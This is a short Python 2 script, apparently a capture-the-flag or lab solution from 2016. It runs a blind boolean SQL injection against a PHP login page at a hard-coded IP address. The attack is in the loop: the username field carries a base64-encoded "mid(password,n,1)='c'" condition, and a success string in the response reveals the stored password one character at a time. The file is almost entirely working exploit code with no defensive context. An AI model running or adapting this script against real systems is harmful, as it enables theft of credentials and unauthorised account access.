'''
Created on 2016-2-16

@author: wenhuizone
'''
'''
Created on 2016-2-14
@author: wenhuizone
'''
import requests
import string
import base64

URL='http://140.113.194.85:49165/loginsystem/index.php'
resp=requests.get(URL).headers
headers={
    'Host': '140.113.194.85:49165',
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
    'Cookie':'PHPSESSID=4slth1mp0fqdppvfl34e9hocs3'
}
list="0123456789abcdefghijklmnopqrstuvwxyz"
def post(i):
    resp=requests.get(URL,headers=headers).text
    payload={'username':i,
             'password':'dGVzdA=='
              }
    re=requests.post(URL,headers=headers,data=payload).text
    return 'Hello , test !' in re
p=''
for n in range(1,32):
    for i in list:
        x="test' and mid(password,%s,1)='%s' and '1" %(n,i)
        if post(base64.b64encode(x)):
            p=p+i
            print 'password:%s' % p
            break